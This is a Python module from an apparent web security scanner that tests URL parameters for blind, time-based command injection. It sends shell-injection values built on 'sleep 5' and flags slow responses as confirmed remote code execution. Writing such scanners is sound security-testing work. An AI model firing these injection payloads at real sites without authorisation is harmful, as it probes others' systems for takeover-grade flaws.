import asyncio
import time
from modules.core import console

# Blind RCE Payloads (Time Based)
# We look for a delay of ~5 seconds.
BLIND_RCE_PAYLOADS = [
    '; sleep 5;',
    '| sleep 5',
    '&& sleep 5',
    '`sleep 5`',
    '$(sleep 5)'
]

async def check_blind_rce(session, url, param):
    try:
        for payload in BLIND_RCE_PAYLOADS:
            target = f"{url}?{param}={payload}"
            if "?" in url: target = f"{url}&{param}={payload}"
            
            start_time = time.time()
            try:
                async with session.get(target, timeout=20, ssl=False) as resp:
                    await resp.read() # Ensure we wait for full body
            except Exception:
                pass # Timeout might also indicate success if timeout < sleep, but here we set timeout=20
            
            end_time = time.time()
            duration = end_time - start_time
            
            # If duration is >= 5 seconds (allow some buffer for RTT, say > 4.5)
            # And standard request is fast (we assume standard is fast for now)
            if duration >= 4.5:
                 return {
                    "url": target,
                    "param": param,
                    "type": "Ghost RCE (Time-Based)",
                    "payload": payload,
                    "duration": f"{duration:.2f}s"
                }
    except Exception:
        pass
    return None

async def scan_blind_rce(session, url):
    """
    Scan for Blind RCE (Time-Based).
    """
    console.print(f"\n[bold cyan]--- Ghost RCE Scanner (Blind) ---[/bold cyan]")
    
    # Needs params
    params = ["cmd", "exec", "command", "ping", "query", "search", "id"]
    
    tasks = [check_blind_rce(session, url, p) for p in params]
    # Run sequentially or limited concurrency to avoid flooding self if successful sleep
    results = await asyncio.gather(*tasks)
    
    found = []
    for res in results:
        if res:
             console.print(f"  [bold red][!] GHOST RCE CONFIRMED: {res['param']}[/bold red]")
             console.print(f"      Payload: {res['payload']}")
             console.print(f"      Response Time: {res['duration']}")
             found.append(res)
             
    if not found:
        console.print("[dim][-] No time-based RCE detected.[/dim]")
        
    return found
